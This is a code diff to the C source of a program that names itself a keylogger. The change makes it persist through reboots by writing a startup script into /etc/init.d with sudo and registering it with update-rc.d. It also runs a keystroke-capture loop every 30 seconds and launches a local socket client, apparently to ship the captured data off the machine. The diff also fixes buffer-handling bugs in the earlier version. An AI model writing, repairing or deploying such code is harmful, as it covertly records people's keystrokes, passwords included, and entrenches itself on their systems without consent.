@@ -10,25 +10,27 @@ void time_30s(int trigger);
 
 int main (){
   keylogger_init();
-  char* cwd;
-  char* dir_cli;
-  char* dir_main;
+  char cwd[1024];
+  char dir_cli[1024];
+  char dir_main[1024];
   if (getcwd(cwd, sizeof(cwd)) != NULL){
-    strcat(dir_main, cwd);
+    strcpy(dir_main, cwd);
     strcat(dir_main,"/main &");
-    char* comm = "sudo echo ";
+    char comm[1024];
+    strcpy(comm,"sudo sh -c \"echo \'#!/bin/bash\n");
     strcat(comm, dir_main);
-    strcat(comm, " > /etc/init.d/RunKeylogger");
+    strcat(comm, "\' >> /etc/init.d/RunKeylogger\"");
+    printf("%s\n",comm);
     system(comm);
-
     system("sudo chmod +x /etc/init.d/RunKeylogger");
-    system("sudo update-rc.d /etc/init.d/RunKeylogger defaults");
+    system("sudo update-rc.d RunKeylogger defaults");
+    
+    strcat(dir_cli,cwd);
+    strcat(dir_cli, "/socket/client");
     while (1){
       keylogger_start();
       time_30s(trigger);
       keylogger_end();
-      strcat(dir_cli,cwd);
-      strcat(dir_cli, "/socket/client");
       system(dir_cli);
     }
   }
